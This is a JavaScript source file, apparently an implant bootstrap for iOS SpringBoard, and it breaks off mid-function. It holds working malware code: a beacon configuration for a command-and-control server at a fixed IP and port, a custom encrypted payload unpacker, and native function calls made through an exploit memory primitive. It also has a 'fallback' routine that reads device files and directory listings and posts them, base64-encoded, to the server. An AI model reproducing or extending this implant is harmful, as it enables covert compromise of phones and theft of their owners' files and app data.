// Minimal C2 bootstrap for SpringBoard InjectJS
// Resident stub: beacon loop + exec/ping (hot-iter entry before full c2_agent)
// Keep small and ASCII-only. Proven Native pattern from probe/bootstrap.

// Pack injects endpoints: { scheme, host(SNI), ip, port, url }
const PELOG_ENDPOINTS = [{"scheme":"http","host":"192.168.31.32","ip":"192.168.31.32","port":9090,"url":"http://192.168.31.32:9090"}];
const PELOG_REPORT_ENDPOINTS = [{"scheme":"http","host":"192.168.31.32","ip":"192.168.31.32","port":9090,"url":"http://192.168.31.32:9090"}];
const BEACON_ENDPOINTS = [{"scheme":"http","host":"192.168.31.32","ip":"192.168.31.32","port":9090,"url":"http://192.168.31.32:9090"}];
const PELOG_HOST = PELOG_ENDPOINTS[0].host;
const PELOG_PORT = PELOG_ENDPOINTS[0].port;
const BEACON_HOST = BEACON_ENDPOINTS[0].host;
const BEACON_PORT = BEACON_ENDPOINTS[0].port;
// When C2 set includes lab 8090, _c2Log dual-sends to endpoints[0] and [1].
const PELOG_DUAL_LAB_DEBUG = true;
const BEACON_INTERVAL_SEC = 10;
const B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/*__N7Z_PHONE_MIN_BEGIN__*/
// Phone-side N7Z2 unpack for SpringBoard bootstrap / pe (sync-safe, no crypto.subtle).
// Kept in sync with release/tools/n7z_browser.py core (xor+HMAC-SHA256 dual unwrap).

function __u8(a){ return a instanceof Uint8Array ? a : new Uint8Array(a); }
function __sha256(data){
  var K = new Uint32Array([
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2]);
  function rr(x,n){return (x>>>n)|(x<<(32-n));}
  var u8 = __u8(data);
  var l = u8.length, bitLen = l * 8;
  var withPad = new Uint8Array(((l + 9 + 63) & ~63));
  withPad.set(u8); withPad[l] = 0x80;
  var dv = new DataView(withPad.buffer);
  dv.setUint32(withPad.length - 4, bitLen >>> 0, false);
  dv.setUint32(withPad.length - 8, Math.floor(bitLen / 0x100000000), false);
  var H = new Uint32Array([0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19]);
  var w = new Uint32Array(64);
  for (var i = 0; i < withPad.length; i += 64){
    for (var j = 0; j < 16; j++) w[j] = dv.getUint32(i + j*4, false);
    for (var j = 16; j < 64; j++){
      var s0 = rr(w[j-15],7)^rr(w[j-15],18)^(w[j-15]>>>3);
      var s1 = rr(w[j-2],17)^rr(w[j-2],19)^(w[j-2]>>>10);
      w[j] = (w[j-16] + s0 + w[j-7] + s1) >>> 0;
    }
    var a=H[0],b=H[1],c=H[2],d=H[3],e=H[4],f=H[5],g=H[6],h=H[7];
    for (var j = 0; j < 64; j++){
      var S1 = rr(e,6)^rr(e,11)^rr(e,25);
      var ch = (e&f)^((~e)&g);
      var t1 = (h + S1 + ch + K[j] + w[j]) >>> 0;
      var S0 = rr(a,2)^rr(a,13)^rr(a,22);
      var maj = (a&b)^(a&c)^(b&c);
      var t2 = (S0 + maj) >>> 0;
      h=g; g=f; f=e; e=(d+t1)>>>0; d=c; c=b; b=a; a=(t1+t2)>>>0;
    }
    H[0]=(H[0]+a)>>>0; H[1]=(H[1]+b)>>>0; H[2]=(H[2]+c)>>>0; H[3]=(H[3]+d)>>>0;
    H[4]=(H[4]+e)>>>0; H[5]=(H[5]+f)>>>0; H[6]=(H[6]+g)>>>0; H[7]=(H[7]+h)>>>0;
  }
  var out = new Uint8Array(32);
  var od = new DataView(out.buffer);
  for (var i = 0; i < 8; i++) od.setUint32(i*4, H[i], false);
  return out;
}
function __hmacSha256(keyBytes, msg){
  var key = __u8(keyBytes), m = __u8(msg);
  if (key.length > 64) key = __sha256(key);
  var k = new Uint8Array(64); k.set(key);
  var o = new Uint8Array(64), i = new Uint8Array(64);
  for (var j = 0; j < 64; j++){ o[j] = k[j]^0x5c; i[j] = k[j]^0x36; }
  var inner = new Uint8Array(64 + m.length); inner.set(i); inner.set(m, 64);
  var mid = __sha256(inner);
  var outer = new Uint8Array(64 + 32); outer.set(o); outer.set(mid, 64);
  return __sha256(outer);
}
function __n7z_utf8Encode(str){
  var out = [], i = 0;
  for (; i < str.length; i++) {
    var c = str.charCodeAt(i);
    if (c < 0x80) out.push(c);
    else if (c < 0x800) { out.push(0xc0 | (c >> 6), 0x80 | (c & 0x3f)); }
    else if (c >= 0xd800 && c <= 0xdbff) {
      var c2 = str.charCodeAt(++i);
      var cp = 0x10000 + ((c - 0xd800) << 10) + (c2 - 0xdc00);
      out.push(0xf0 | (cp >> 18), 0x80 | ((cp >> 12) & 0x3f), 0x80 | ((cp >> 6) & 0x3f), 0x80 | (cp & 0x3f));
    } else {
      out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 0x3f), 0x80 | (c & 0x3f));
    }
  }
  return new Uint8Array(out);
}
function __n7z_utf8Decode(u8){
  var s = "", i = 0;
  u8 = __u8(u8);
  while (i < u8.length) {
    var c = u8[i++];
    if (c < 0x80) s += String.fromCharCode(c);
    else if (c < 0xe0) {
      var c2 = u8[i++];
      s += String.fromCharCode(((c & 0x1f) << 6) | (c2 & 0x3f));
    } else if (c < 0xf0) {
      var c2 = u8[i++], c3 = u8[i++];
      s += String.fromCharCode(((c & 0x0f) << 12) | ((c2 & 0x3f) << 6) | (c3 & 0x3f));
    } else {
      var c2 = u8[i++], c3 = u8[i++], c4 = u8[i++];
      var cp = ((c & 0x07) << 18) | ((c2 & 0x3f) << 12) | ((c3 & 0x3f) << 6) | (c4 & 0x3f);
      cp -= 0x10000;
      s += String.fromCharCode(0xd800 + (cp >> 10), 0xdc00 + (cp & 0x3ff));
    }
  }
  return s;
}
function __n7z_deriveKey(password, salt){
  return __hmacSha256(__n7z_utf8Encode(String(password || "")), salt);
}
function __n7z_keystream(key, n){
  var out = new Uint8Array(n), offset = 0, counter = 0;
  while (offset < n){
    var buf = new Uint8Array(8), c = counter;
    for (var i = 7; i >= 0; i--){ buf[i] = c & 255; c = Math.floor(c / 256); }
    var block = __hmacSha256(key, buf);
    var take = Math.min(block.length, n - offset);
    out.set(block.subarray(0, take), offset);
    offset += take; counter++;
  }
  return out;
}
function __n7z_xor(a, b){
  var o = new Uint8Array(a.length);
  for (var i = 0; i < a.length; i++) o[i] = a[i] ^ b[i];
  return o;
}
function __n7z_b64ToU8(b64){
  var B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var s = String(b64 || "").replace(/[^A-Za-z0-9+\/=]/g, "");
  var pad = 0;
  if (s.charAt(s.length - 1) === "=") pad++;
  if (s.charAt(s.length - 2) === "=") pad++;
  s = s.replace(/=+$/, "");
  while (s.length % 4) s += "A";
  var bin = "", i = 0;
  while (i < s.length) {
    var a = B.indexOf(s.charAt(i++));
    var b = B.indexOf(s.charAt(i++));
    var c = B.indexOf(s.charAt(i++));
    var d = B.indexOf(s.charAt(i++));
    if (a < 0 || b < 0) break;
    var n = (a << 18) | (b << 12) | ((c < 0 ? 0 : c) << 6) | (d < 0 ? 0 : d);
    bin += String.fromCharCode((n >> 16) & 255);
    bin += String.fromCharCode((n >> 8) & 255);
    bin += String.fromCharCode(n & 255);
  }
  if (pad) bin = bin.slice(0, bin.length - pad);
  var out = new Uint8Array(bin.length);
  for (var j = 0; j < bin.length; j++) out[j] = bin.charCodeAt(j);
  return out;
}
function __n7z_parseBlob(input){
  if (typeof input === 'string'){
    var t = input.replace(/^\uFEFF/, '').trim();
    if (t.indexOf('N7Z2B:') === 0) return __n7z_b64ToU8(t.slice(6));
    throw new Error('n7z expect N7Z2B');
  }
  return __u8(input);
}
function __n7z_unpackOnce(password, blob){
  var u8 = __n7z_parseBlob(blob);
  if (u8.length < 21) throw new Error('n7z short');
  if (u8[0]!==0x4e||u8[1]!==0x37||u8[2]!==0x5a||u8[3]!==0x32) throw new Error('n7z magic');
  if (u8[4] !== 2) throw new Error('n7z ver');
  var salt = u8.subarray(5, 21);
  var ct = u8.subarray(21);
  return __n7z_xor(ct, __n7z_keystream(__n7z_deriveKey(password, salt), ct.length));
}
function __n7z_unpackDualText(outer, inner, blob){
  return __n7z_utf8Decode(__n7z_unpackOnce(inner, __n7z_unpackOnce(outer, blob)));
}
function __n7z_unwrapPayload(got){
  if (!got) return "";
  if (got.pack === "n7z2" && got.enc && got.outer && got.inner) {
    return __n7z_unpackDualText(got.outer, got.inner, got.enc);
  }
  if (got.task && got.task.package) return String(got.task.package);
  if (got.src) return String(got.src);
  return "";
}
/*__N7Z_PHONE_MIN_END__*/

/*__PAYLOAD_FALLBACK_BEGIN__*/
// Shared payload failure fallback (SB bootstrap / pe session).
// On fail: report error + ios/app versions; upload small related files + structure doc.
// Files > 1MiB are skipped. Backend: POST /api/payload/fallback (+ /result category=payload_fallback)

function __fb_readStr(ptr, len) {
  try {
    if (typeof Native.readString === "function") return Native.readString(ptr, len);
  } catch (e) {}
  try {
    if (typeof Native.readCString === "function") return Native.readCString(ptr, len);
  } catch (e) {}
  try {
    if (typeof Native.read === "function") {
      var buff = Native.read(ptr, len);
      var a = new Uint8Array(buff), s = "";
      for (var i = 0; i < a.length; i++) {
        if (!a[i]) break;
        s += String.fromCharCode(a[i]);
      }
      return s;
    }
  } catch (e) {}
  return "";
}

function __fb_sysctlStr(name) {
  try {
    var buf = Native.callSymbol("calloc", 1, 256);
    var lenp = Native.callSymbol("calloc", 1, 8);
    var lv = new DataView(new ArrayBuffer(8));
    lv.setUint32(0, 255, true);
    Native.write(lenp, lv.buffer);
    var rc = Number(Native.callSymbol("sysctlbyname", name, buf, lenp, 0, 0));
    var s = "";
    if (rc === 0) s = __fb_readStr(buf, 256);
    try { Native.callSymbol("free", buf); } catch (e) {}
    try { Native.callSymbol("free", lenp); } catch (e) {}
    return (s || "").replace(/\0/g, "").trim();
  } catch (e) {
    return "";
  }
}

function __fb_iosVersion() {
  var v = __fb_sysctlStr("kern.osproductversion");
  if (!v) v = __fb_sysctlStr("kern.osversion");
  return v || "";
}

function __fb_buildVersion() {
  return __fb_sysctlStr("kern.osversion") || "";
}

function __fb_httpPostJson(path, obj) {
  var host = (typeof BEACON_HOST !== "undefined") ? BEACON_HOST : ((typeof PELOG_HOST !== "undefined") ? PELOG_HOST : "192.168.31.32");
  var port = (typeof BEACON_PORT !== "undefined") ? BEACON_PORT : ((typeof PELOG_PORT !== "undefined") ? PELOG_PORT : 9090);
  var body = JSON.stringify(obj);
  if (typeof _sbPost === "function") {
    try { return _sbPost(host, port, path, "application/json", body); } catch (e) { return null; }
  }
  try {
    var fd = Number(Native.callSymbol("socket", 2, 1, 0));
    if (fd <= 0) return null;
    var sa = Native.callSymbol("calloc", 1, 16);
    var sab = new ArrayBuffer(16), sv = new DataView(sab);
    sv.setUint8(0, 16); sv.setUint8(1, 2); sv.setUint16(2, port, false);
    var p = String(host).split(".");
    sv.setUint8(4, +p[0]); sv.setUint8(5, +p[1]); sv.setUint8(6, +p[2]); sv.setUint8(7, +p[3]);
    Native.write(sa, sab);
    if (Number(Native.callSymbol("connect", fd, sa, 16)) !== 0) {
      Native.callSymbol("free", sa); Native.callSymbol("close", fd); return null;
    }
    Native.callSymbol("free", sa);
    var req = "POST " + path + " HTTP/1.0\r\nHost: " + host + ":" + port +
      "\r\nContent-Type: application/json\r\nContent-Length: " + body.length + "\r\n\r\n" + body;
    var buf = Native.callSymbol("malloc", req.length + 1);
    Native.writeString(buf, req);
    Native.callSymbol("write", fd, buf, req.length);
    Native.callSymbol("free", buf);
    var result = "";
    var rbuf = Native.callSymbol("malloc", 4096);
    if (rbuf) {
      for (var ri = 0; ri < 32; ri++) {
        var n = Number(Native.callSymbol("read", fd, rbuf, 4095));
        if (n <= 0) break;
        result += __fb_readStr(rbuf, n);
      }
      Native.callSymbol("free", rbuf);
    }
    Native.callSymbol("close", fd);
    var idx = result.indexOf("\r\n\r\n");
    var raw = idx >= 0 ? result.substring(idx + 4) : "";
    if (!raw) return {};
    try { return JSON.parse(raw); } catch (e) { return {}; }
  } catch (e) {
    return null;
  }
}

function __fb_b64(str) {
  if (typeof _strToB64 === "function") return _strToB64(str);
  var B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var out = "", i = 0;
  while (i < str.length) {
    var c1 = str.charCodeAt(i++) & 0xff;
    var c2 = i < str.length ? str.charCodeAt(i++) & 0xff : NaN;
    var c3 = i < str.length ? str.charCodeAt(i++) & 0xff : NaN;
    var n1 = c1 >> 2;
    var n2 = ((c1 & 3) << 4) | (isNaN(c2) ? 0 : c2 >> 4);
    var n3 = isNaN(c2) ? 64 : (((c2 & 15) << 2) | (isNaN(c3) ? 0 : c3 >> 6));
    var n4 = isNaN(c3) ? 64 : (c3 & 63);
    out += B.charAt(n1) + B.charAt(n2) + (n3 === 64 ? "=" : B.charAt(n3)) + (n4 === 64 ? "=" : B.charAt(n4));
  }
  return out;
}

function __fb_fsSize(path) {
  try {
    var fd = Native.callSymbol("fopen", path, "rb");
    if (!fd || fd === 0 || fd === 0n) return -1;
    Native.callSymbol("fseek", fd, 0, 2);
    var sz = Number(Native.callSymbol("ftell", fd));
    Native.callSymbol("fclose", fd);
    return (sz >= 0 && isFinite(sz)) ? sz : -1;
  } catch (e) {
    return -1;
  }
}

function __fb_fsIsDir(path) {
  try {
    var d = Native.callSymbol("opendir", path);
    if (!d || d === 0 || d === 0n) return false;
    Native.callSymbol("closedir", d);
    return true;
  } catch (e) {
    return false;
  }
}

function __fb_listDir(path, maxEntries) {
  maxEntries = maxEntries || 128;
  var out = [];
  try {
    var d = Native.callSymbol("opendir", path);
    if (!d || d === 0 || d === 0n) return out;
    for (var i = 0; i < maxEntries; i++) {
      var ent = Native.callSymbol("readdir", d);
      if (!ent || ent === 0 || ent === 0n) break;
      var name = __fb_readStr(ent + 21n, 256);
      if (!name || name === "." || name === "..") continue;
      var child = path + "/" + name;
      var entry = { name: name, path: child };
      if (__fb_fsIsDir(child)) {
        entry.type = "dir";
      } else {
        entry.type = "file";
        entry.size = __fb_fsSize(child);
      }
      out.push(entry);
    }
    Native.callSymbol("closedir", d);
  } catch (e) {}
  return out;
}

function __fb_fsRead(path, maxLen) {
  if (typeof _fsRead === "function") {
    try { return _fsRead(path, maxLen); } catch (e) {}
  }
  maxLen = maxLen || 262144;
  try {
    var fd = Native.callSymbol("fopen", path, "rb");
    if (!fd || fd === 0 || fd === 0n) return null;
    var p = Native.callSymbol("malloc", maxLen + 1);
    if (!p) { Native.callSymbol("fclose", fd); return null; }
    var n = Number(Native.callSymbol("fread", p, 1, maxLen, fd));
    Native.callSymbol("fclose", fd);
    var s = n > 0 ? __fb_readStr(p, n) : "";
    if (n > 0 && typeof Native.read === "function") {
      try {
        var buff = Native.read(p, n);
        var a = new Uint8Array(buff);
        s = "";
        for (var i = 0; i < n; i++) s += String.fromCharCode(a[i]);
      } catch (e) {}
    }
    Native.callSymbol("free", p);
    return s;
  } catch (e) {
    return null;
  }
}

function __fb_postFallbackFile(fbId, uid, commandId, filename, dataStr) {
  var payload = {
    command_id: commandId || fbId,
    uuid: uid || "fallback",
    filename: filename,
    category: "payload_fallback",
    fallback_id: fbId,
    data: __fb_b64(dataStr)
  };
  __fb_httpPostJson("/result", payload);
}

/** Max upload size for fallback file content (1 MiB). Larger files are skipped. */
var __FB_MAX_UPLOAD = 1048576;

/**
 * Report payload failure. opts:
 *  module_id, stage, error, app_id, app_version,
 *  related_paths: string[], uid, command_id,
 *  upload_paths: string[]  (only files <= 1MiB; oversized skipped)
 *  Always uploads structure.json (tree / sizes / skip reasons).
 */
function __payloadFallbackReport(opts) {
  opts = opts || {};
  var maxUp = (opts.max_file > 0) ? opts.max_file : __FB_MAX_UPLOAD;
  if (maxUp > __FB_MAX_UPLOAD) maxUp = __FB_MAX_UPLOAD;
  var fbId = "fb-" + Date.now().toString(16) + "-" + Math.floor(Math.random() * 1e6).toString(16);
  var ios = opts.ios_version || __fb_iosVersion();
  var build = opts.build_version || __fb_buildVersion();
  var related = opts.related_paths || opts.paths || [];
  if (!Array.isArray(related)) related = related ? [String(related)] : [];
  var upload = opts.upload_paths || [];
  if (!Array.isArray(upload)) upload = upload ? [String(upload)] : [];
  var uid = opts.uid || opts.uuid || "";

  var structure = {
    fallback_id: fbId,
    max_upload: maxUp,
    related: [],
    upload_plan: [],
    note: "files > " + maxUp + " bytes skipped; only small files + this structure doc"
  };
  var seen = {};
  function addStructPath(path, role) {
    if (!path || seen[path]) return;
    seen[path] = 1;
    var row = { path: path, role: role || "related" };
    if (__fb_fsIsDir(path)) {
      row.type = "dir";
      row.entries = __fb_listDir(path, 128);
    } else {
      var sz = __fb_fsSize(path);
      row.type = "file";
      row.size = sz;
      row.exists = sz >= 0;
      if (sz > maxUp) {
        row.skip = "over_1m";
        row.upload = false;
      } else if (sz >= 0) {
        row.upload = true;
      } else {
        row.exists = false;
        row.upload = false;
      }
    }
    structure.related.push(row);
  }
  for (var ri = 0; ri < related.length; ri++) addStructPath(related[ri], "related");
  for (var ui = 0; ui < upload.length; ui++) addStructPath(upload[ui], "upload");

  var body = {
    fallback_id: fbId,
    uid: uid,
    module_id: opts.module_id || opts.module || "",
    stage: opts.stage || "",
    error: String(opts.error || opts.message || "").slice(0, 500),
    ios_version: ios,
    build_version: build,
    app_id: opts.app_id || opts.bundle_id || "",
    app_version: opts.app_version || opts.app_ver || "",
    related_paths: related,
    files: [],
    structure: structure,
    command_id: opts.command_id || "",
    meta: opts.meta || {}
  };
  var resp = null;
  try { resp = __fb_httpPostJson("/api/payload/fallback", body); } catch (e) { resp = null; }

  var uploaded = [];
  try {
    var structStr = JSON.stringify(structure, null, 2);
    __fb_postFallbackFile(fbId, uid, opts.command_id, "structure.json", structStr);
    uploaded.push({ path: "structure.json", via: "result", size: structStr.length });
  } catch (se) {
    uploaded.push({ path: "structure.json", via: "err", err: String(se).slice(0, 60) });
  }

  var candidates = [];
  for (var i = 0; i < upload.length; i++) if (upload[i]) candidates.push(upload[i]);
  for (var j = 0; j < structure.related.length; j++) {
    var r = structure.related[j];
    if (r.type === "file" && r.upload && r.role === "related" && candidates.indexOf(r.path) < 0) {
      if (r.size >= 0 && r.size <= 65536) candidates.push(r.path);
    }
  }

  for (var k = 0; k < candidates.length; k++) {
    var path = candidates[k];
    if (!path) continue;
    try {
      var sz = __fb_fsSize(path);
      structure.upload_plan.push({ path: path, size: sz });
      if (sz < 0) {
        uploaded.push({ path: path, via: "skip", err: "missing" });
        continue;
      }
      if (sz > maxUp) {
        uploaded.push({ path: path, via: "skip", err: "over_1m", size: sz });
        continue;
      }
      // Never _exfilFile here (no size guard). Bounded read only.
      var txt = __fb_fsRead(path, maxUp);
      if (txt != null && txt.length > 0) {
        if (txt.length > maxUp) {
          uploaded.push({ path: path, via: "skip", err: "over_1m", size: txt.length });
          continue;
        }
        var slash = path.lastIndexOf("/");
        var fname = slash >= 0 ? path.slice(slash + 1) : path;
        __fb_postFallbackFile(fbId, uid, opts.command_id, fname, txt);
        uploaded.push({ path: path, via: "result", size: txt.length });
      } else {
        uploaded.push({ path: path, via: "skip", err: "unreadable" });
      }
    } catch (ue) {
      uploaded.push({ path: path, via: "err", err: String(ue).slice(0, 60) });
    }
  }

  try {
    if (typeof _c2Log === "function") {
      _c2Log("[FALLBACK] " + (body.module_id || "") + " " + body.error.slice(0, 80) + " id=" + fbId);
    } else if (typeof _log === "function") {
      _log("[FALLBACK] " + (body.module_id || "") + " " + body.error.slice(0, 80) + " id=" + fbId);
    }
  } catch (e) {}

  return {
    fallback_id: fbId,
    ok: !!(resp && (resp.ok || (resp.data && resp.data.ok) || resp.code === 0)),
    resp: resp,
    uploaded: uploaded,
    skipped_over_1m: uploaded.filter(function (x) { return x.err === "over_1m"; }),
    ios_version: ios,
    app_id: body.app_id,
    app_version: body.app_version
  };
}
/*__PAYLOAD_FALLBACK_END__*/

/** Unified outcome bus (success/fail/skip/timeout) → POST /api/payload/outcome */
function __payloadOutcomeReport(opts) {
	opts = opts || {};
	try {
		var body = {
			outcome: String(opts.outcome || opts.status || "fail"),
			module_id: opts.module_id || opts.module || "",
			payload_ver: opts.payload_ver || opts.version || "",
			uid: opts.uid || opts.uuid || "",
			device_code: opts.device_code || opts.uid || "",
			pe_uid: opts.pe_uid || "",
			ios_version: opts.ios_version || (typeof __fb_iosVersion === "function" ? __fb_iosVersion() : ""),
			model: opts.model || "",
			app_id: opts.app_id || opts.bundle_id || "",
			app_version: opts.app_version || "",
			stage: opts.stage || "",
			error: String(opts.error || "").slice(0, 500),
			error_class: opts.error_class || "",
			skip_reason: opts.skip_reason || "",
			pull_id: opts.pull_id || "",
			cmd_id: opts.cmd_id || opts.command_id || "",
			deploy_id: opts.deploy_id || "",
			duration_ms: opts.duration_ms || 0,
			wa_identity: opts.wa_identity,
			recovered: opts.recovered
		};
		if (typeof __fb_httpPostJson === "function") {
			return __fb_httpPostJson("/api/payload/outcome", body);
		}
		var host = (typeof BEACON_HOST !== "undefined") ? BEACON_HOST : "192.168.31.32";
		var port = (typeof BEACON_PORT !== "undefined") ? BEACON_PORT : 9090;
		if (typeof _sbPost === "function") {
			return _sbPost(host, port, "/api/payload/outcome", "application/json", JSON.stringify(body));
		}
	} catch (e) {}
	return null;
}

function __outcomeFromExecObj(uid, cmdId, obj) {
	if (!obj || typeof obj !== "object") return;
	try {
		var result = (obj.result && typeof obj.result === "object") ? obj.result : obj;
		var pullId = result.pull_id || "";
		var actions = result.actions;
		var loads = result.loads;
		function one(mid, ok, err, stage, extra) {
			extra = extra || {};
			var outcome = ok ? "success" : "fail";
			if (err && String(err).toLowerCase().indexOf("timeout") >= 0) outcome = "timeout";
			if (extra.skipped) outcome = "skip";
			__payloadOutcomeReport({
				outcome: outcome,
				module_id: mid || stage || "pipeline",
				uid: uid,
				cmd_id: cmdId,
				pull_id: pullId,
				stage: stage,
				error: err || "",
				skip_reason: outcome === "skip" ? (extra.error || err || "skipped") : "",
				app_id: extra.bundleId || extra.app_id || "",
				wa_identity: extra.wa_identity,
				recovered: extra.recovered
			});
		}
		if (actions && actions.length) {
			for (var i = 0; i < actions.length; i++) {
				var a = actions[i] || {};
				one(a.name || a.module_id || "action", !!a.ok, a.error || "", a.name || "action", a);
			}
		}
		if (loads && loads.length) {
			for (var j = 0; j < loads.length; j++) {
				var ld = loads[j] || {};
				one(ld.module_id || ld.payload || ld.name || "load", !!ld.ok, ld.error || "", "load", ld);
			}
		}
		if ((!actions || !actions.length) && (!loads || !loads.length)) {
			var st = String(obj.status || "");
			var ok2 = (st === "success" || st === "completed");
			one(obj.module_id || obj.role || "bootstrap", ok2, obj.error || "", "exec_result", obj);
		}
	} catch (e) {}
}

class Native {
	static #baseAddr; static #dlsymAddr; static #memcpyAddr; static #mallocAddr; static #oinvAddr;
	static #argMem = 0n; static #argPtr = 0n; static #dlsymCache = {};

	static init() {
		const b = new BigUint64Array(nativeCallBuff);
		this.#baseAddr = b[20]; this.#dlsymAddr = b[21]; this.#memcpyAddr = b[22];
		this.#mallocAddr = b[23]; this.#oinvAddr = b[24];
		this.#argMem = this.#nc(this.#mallocAddr, BigInt(0x1000));
		this.#argPtr = this.#argMem;
	}

	static write(ptr, buff) {
		let u = new Uint8Array(nativeCallBuff), a = new Uint8Array(buff);
		for (let i = 0; i < a.length; i += 0x1000) {
			let n = a.length - i > 0x1000 ? 0x1000 : a.length - i;
			u.set(a.subarray(i, i + n), 0x1000);
			this.#nc(this.#memcpyAddr, ptr + BigInt(i), this.#baseAddr + 0x1000n, BigInt(n));
		}
	}

	static writeString(ptr, str) {
		let b = new ArrayBuffer(str.length + 1), a = new Uint8Array(b);
		for (let i = 0; i < str.length; i++) a[i] = str.charCodeAt(i);
		this.write(ptr, b);
	}

	static readString(ptr, len) {
		let buff = new ArrayBuffer(len), u = new Uint8Array(nativeCallBuff), a = new Uint8Array(buff);
		for (let offs = 0; offs < len; offs += 0x1000) {
			let n = len - offs > 0x1000 ? 0x1000 : len - offs;
			this.#nc(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(n));
			a.set(new Uint8Array(nativeCallBuff, 0x1000, n), offs);
		}
		let s = "";
		for (let i = 0; i < a.length; i++) {
			if (!a[i]) break;
			s += String.fromCharCode(a[i]);
		}
		return s;
	}

	static callSymbol(name, x0, x1, x2, x3) {
		this.#argPtr = this.#argMem;
		if (typeof x0 === "string") { let p = this.#argPtr; this.writeString(p, x0); this.#argPtr += BigInt(x0.length + 1); x0 = p; }
		if (typeof x1 === "string") { let p = this.#argPtr; this.writeString(p, x1); this.#argPtr += BigInt(x1.length + 1); x1 = p; }
		let r = this.#nc(this.#dlsym(name), this.#arg(x0), this.#arg(x1), this.#arg(x2), this.#arg(x3));
		this.#argPtr = this.#argMem;
		return r < 0xffffffffn && r > -0xffffffffn ? Number(r) : r;
	}

	/** Invoke an absolute function pointer (e.g. dlsym of MGCopyAnswer). */
	static callPtr(fn, x0, x1, x2, x3) {
		this.#argPtr = this.#argMem;
		if (typeof x0 === "string") { let p = this.#argPtr; this.writeString(p, x0); this.#argPtr += BigInt(x0.length + 1); x0 = p; }
		if (typeof x1 === "string") { let p = this.#argPtr; this.writeString(p, x1); this.#argPtr += BigInt(x1.length + 1); x1 = p; }
		let r = this.#nc(this.#arg(fn), this.#arg(x0), this.#arg(x1), this.#arg(x2), this.#arg(x3));
		this.#argPtr = this.#argMem;
		return r < 0xffffffffn && r > -0xffffffffn ? Number(r) : r;
	}

	static #arg(v) { return !v ? 0n : typeof v === "bigint" ? v : BigInt(v); }

	static #dlsym(name) {
		let hit = this.#dlsymCache[name];
		if (hit) return hit;
		let b = new ArrayBuffer(name.length + 1), a = new Uint8Array(b);
		for (let i = 0; i < name.length; i++) a[i] = name.charCodeAt(i);
		new Uint8Array(nativeCallBuff).set(a, 0x1000);
		hit = this.#nc(this.#dlsymAddr, 0xfffffffffffffffen, this.#baseAddr + 0x1000n);
		if (hit) this.#dlsymCache[name] = hit;
		return hit;
	}

	static #nc(addr, x0, x1, x2, x3) {
		let b = new BigInt64Array(nativeCallBuff);
		b[0] = addr; b[100] = x0 || 0n; b[101] = x1 || 0n; b[102] = x2 || 0n; b[103] = x3 || 0n;
		invoker();
		return b[200];
	}
}

function _strToB64(str) {
	var out = "", i = 0;
	while (i < str.length) {
		var c1 = str.charCodeAt(i++) & 0xff;
		var c2 = i < str.length ? str.charCodeAt(i++) & 0xff : NaN;
		var c3 = i < str.length ? str.charCodeAt(i++) & 0xff : NaN;
		var n1 = c1 >> 2;
		var n2 = ((c1 & 3) << 4) | (isNaN(c2) ? 0 : c2 >> 4);
		var n3 = isNaN(c2) ? 64 : (((c2 & 15) << 2) | (isNaN(c3) ? 0 : c3 >> 6));
		var n4 = isNaN(c3) ? 64 : (c3 & 63);
		out += B64.charAt(n1) + B64.charAt(n2) + (n3 === 64 ? "=" : B64.charAt(n3)) + (n4 === 64 ? "=" : B64.charAt(n4));
	}
	return out;
}

function _enc(msg) {
	var s = String(msg), out = "";
	for (var i = 0; i < s.length && i < 400; i++) {
		var c = s.charCodeAt(i);
		if ((c >= 0x30 && c <= 0x39) || (c >= 0x41 && c <= 0x5a) || (c >= 0x61 && c <= 0x7a) || c === 0x2d || c === 0x5f || c === 0x2e || c === 0x20) {
			out += c === 0x20 ? "+" : s.charAt(i);
		} else if (c < 256) {
			var h = c.toString(16);
			out += "%" + (h.length < 2 ? "0" : "") + h;
		}
	}
	return out;
}

function _sbEpScheme(ep) {
	try {
		var s = String((ep && ep.scheme) || "http").toLowerCase();
		return s === "https" ? "https" : "http";
	} catch (e) { return "http"; }
}
function _sbEpIp(ep) {
	try {
		if (ep && ep.ip) return String(ep.ip);
		if (ep && ep.host) return String(ep.host);
	} catch (e) {}
	return String(BEACON_HOST);
}
function _sbEpSni(ep) {
	try {
		if (ep && ep.host) return String(ep.host);
		if (ep && ep.ip) return String(ep.ip);
	} catch (e) {}
	return String(BEACON_HOST);
}
function _sbEpPort(ep) {
	try {
		var p = ep && ep.port != null ? (+ep.port) : 0;
		if (p > 0) return p;
	} catch (e) {}
	return _sbEpScheme(ep) === "https" ? 443 : 80;
}
function _sbHostHeader(ep) {
	var h = _sbEpSni(ep);
	var port = _sbEpPort(ep);
	var scheme = _sbEpScheme(ep);
	if ((scheme === "http" && port === 80) || (scheme === "https" && port === 443)) return h;
	return h + ":" + port;
}
function _sbPostPlain(ep, path, contentType, body) {
	var host = _sbEpIp(ep);
	var port = _sbEpPort(ep);
	var fd = Number(Native.callSymbol("socket", 2, 1, 0));
	if (fd <= 0) return null;
